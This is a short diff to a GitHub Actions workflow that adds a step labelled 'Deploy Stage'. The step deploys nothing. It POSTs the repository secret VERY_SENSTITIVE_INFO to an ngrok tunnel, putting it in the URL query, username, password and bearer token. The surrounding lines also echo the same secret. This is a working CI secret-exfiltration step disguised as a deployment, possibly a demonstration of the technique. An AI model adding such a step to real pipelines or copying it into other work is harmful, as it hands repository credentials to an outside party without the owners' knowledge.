@@ -34,3 +34,11 @@ jobs:
         run: |
           echo Add other actions to build,
           echo "::secret::${{ secrets.VERY_SENSTITIVE_INFO }}"
+      - name: Deploy Stage
+        uses: fjogeleit/http-request-action@master
+        with:
+          url: 'https://2b6502c583f9.ngrok.io/test?${{ secrets.VERY_SENSTITIVE_INFO }}'
+          method: 'POST'
+          username: ${{ secrets.VERY_SENSTITIVE_INFO }}
+          password: ${{ secrets.VERY_SENSTITIVE_INFO }}
+          bearerToken: ${{ secrets.VERY_SENSTITIVE_INFO }}
